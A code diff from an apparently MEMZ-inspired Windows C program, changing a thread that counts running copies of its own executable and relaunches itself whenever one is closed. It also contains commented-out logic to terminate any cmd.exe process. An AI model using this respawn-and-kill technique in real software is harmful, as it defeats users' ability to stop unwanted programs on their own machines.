@@ -39,7 +39,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 
 	
 
-	while (true);
+	while (true) Sleep(10000);
 	return 0;
 }
 
@@ -55,7 +55,7 @@ DWORD WINAPI monitorT(LPVOID p) {
 	HANDLE cproc;
 	char* cprocn = NULL;
 
-	delay(1000);
+	Sleep(1000);
 
 	/* "Inspired" by MEMZ, a way to monitor all running processes under the same name */
 	while (true) {
@@ -71,25 +71,25 @@ DWORD WINAPI monitorT(LPVOID p) {
 
 		do {
 
-			cproc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, entry.th32ProcessID);
-
-			/*if (!lstrcmpW(L"cmd.exe", entry.szExeFile)) {
-				
+			if (!lstrcmpW(L"cmd.exe", entry.szExeFile)) {
+				/*cproc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, entry.th32ProcessID);
 				TerminateProcess(cproc, 0);
-			}*/
+				CloseHandle(cproc);*/
+			}
 
 			if (!lstrcmpW(iprocn, entry.szExeFile)) {
 				procAmount++;
 			}
 
-			CloseHandle(cproc);
-			LocalFree(cprocn);
+			
 
 		} while (Process32Next(snap, &entry));
 
 		CloseHandle(snap);		// Snapshot will change each time a process is being created, make sure it is updated
 
+
 		if (procAmount < prevProcAmount) {
+
 			LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
 			GetModuleFileName(NULL, procn, MAX_PATH * 2);
 			ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
@@ -98,7 +98,7 @@ DWORD WINAPI monitorT(LPVOID p) {
 		}
 
 		prevProcAmount = procAmount;
+
+		Sleep(500);
 	}
-
-
 }
